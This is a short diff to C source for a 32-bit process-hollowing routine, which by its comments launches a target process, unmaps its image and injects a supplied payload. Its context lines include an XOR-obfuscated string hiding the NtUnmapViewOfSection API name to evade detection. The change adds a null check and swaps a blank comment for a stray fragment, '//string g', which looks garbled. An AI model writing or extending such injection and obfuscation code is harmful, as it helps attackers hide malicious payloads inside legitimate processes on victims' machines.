@@ -10,7 +10,7 @@
 
 // Instanciates a new process specified by payload_info, cuts out the original image and hollows the specified payload into the new process.
 // TLDR;    Process hollowing with 32-bit processes.
-//
+//string g
 // payload_info format:     targetPath,commandLine
 // The ',' character serves as delimiter. The string is split during the wrapper part of the hollowing32 function.
 void hollowing32(unsigned char *payload, char *payload_info) {
@@ -37,8 +37,11 @@ void hollowing32(unsigned char *payload, char *payload_info) {
     targetPath = (LPSTR) strtok(payload_info, ",");    
     
     LPTSTR commandLine;         // The command line that will be attributed to the instanciated process
-    commandLine = (LPTSTR) payload_info;
-
+    if(payload_info != NULL) {
+        commandLine = (LPTSTR) payload_info;
+    } else {
+        commandLine = (LPTSTR) "";
+    }
 		
 	// Obfuscated function name string (keyByte is 0x45)	
 	// unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
